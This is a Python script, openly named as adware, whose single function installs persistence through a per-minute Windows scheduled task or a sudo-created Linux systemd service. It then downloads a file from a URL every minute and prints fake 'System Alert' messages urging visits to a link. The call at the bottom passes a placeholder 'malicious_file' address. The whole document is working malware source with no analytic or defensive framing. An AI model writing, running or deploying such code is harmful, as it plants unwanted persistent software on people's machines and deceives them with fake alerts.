import os
import platform
import requests
import time
import subprocess
from threading import Thread

def adware_auto_download_files_fake_alerts(download_url: str, alert_url: str) -> None:
    def download_file(url):
        response = requests.get(url)
        if response.status_code == 200:
            with open('downloaded_file', 'wb') as file:
                file.write(response.content)
            print(f"File downloaded from {url}")
        else:
            print(f"Failed to download file from {url}")

    def display_alert(url):
        print(f"System Alert: Visit {url} for important updates!")

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            service_command = f'schtasks /create /tn {service_name} /tr "{os.path.abspath(__file__)}" /sc minute /mo 1'
        elif system == "Linux":
            service_name = "adware"
            service_command = f'echo "[Unit]\nDescription=Adware Service\n[Service]\nExecStart={os.path.abspath(__file__)}\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/{service_name}.service && sudo systemctl enable {service_name} && sudo systemctl start {service_name}'
        else:
            print("Unsupported operating system")
            return
        subprocess.run(service_command, shell=True)

    def run_periodically(interval, function, *args):
        while True:
            function(*args)
            time.sleep(interval)

    # Create persistence
    create_persistence()

    # Start threads for periodic tasks
    download_thread = Thread(target=run_periodically, args=(60, download_file, download_url))
    alert_thread = Thread(target=run_periodically, args=(30, display_alert, alert_url))

    download_thread.start()
    alert_thread.start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Adware stopped")

if __name__ == "__main__":
    adware_auto_download_files_fake_alerts("http://example.com/malicious_file", "http://example.com/alert")
